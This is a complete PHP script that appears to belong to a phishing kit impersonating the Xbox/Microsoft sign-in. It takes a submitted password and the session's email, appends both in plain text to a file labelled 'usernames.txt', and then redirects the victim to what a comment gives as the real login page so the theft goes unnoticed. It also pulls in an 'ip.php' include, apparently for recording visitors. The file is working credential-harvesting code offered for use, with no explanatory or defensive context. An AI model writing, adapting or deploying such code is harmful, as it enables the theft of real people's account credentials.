<?php
include "ip.php";
session_start();
$pass = $_POST["passwd"];
$email= $_SESSION["Email"];
file_put_contents("usernames.txt", "Xbox Username: " . $email . "\nPassword: " . $pass . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://login.live.com/login.srf
header("Location: $url");
exit();
?>